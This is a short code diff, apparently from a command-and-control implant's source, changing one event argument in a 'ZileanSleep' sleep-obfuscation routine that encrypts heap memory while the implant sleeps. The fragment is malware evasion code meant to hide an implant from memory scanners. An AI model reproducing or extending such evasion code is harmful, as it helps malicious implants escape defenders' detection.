@@ -556,7 +556,7 @@ VOID ZileanSleep(IN DWORD Timeout) {
 			DBGPRINT("[*] Trigger sleep obfuscation chain \n");
 #endif
 			// Trigger sleep obfuscation chain
-			Status = g_Win32.Nt.NtSignalAndWaitForSingleObject(EventStart, EventWait, FALSE, NULL);
+			Status = g_Win32.Nt.NtSignalAndWaitForSingleObject(EventStart, EventEnd, FALSE, NULL);
 
 			// Decrypt the enumerated heap blocks
 			HeapDataEncrypt(&HeapCrypt, ThreadId, FALSE);
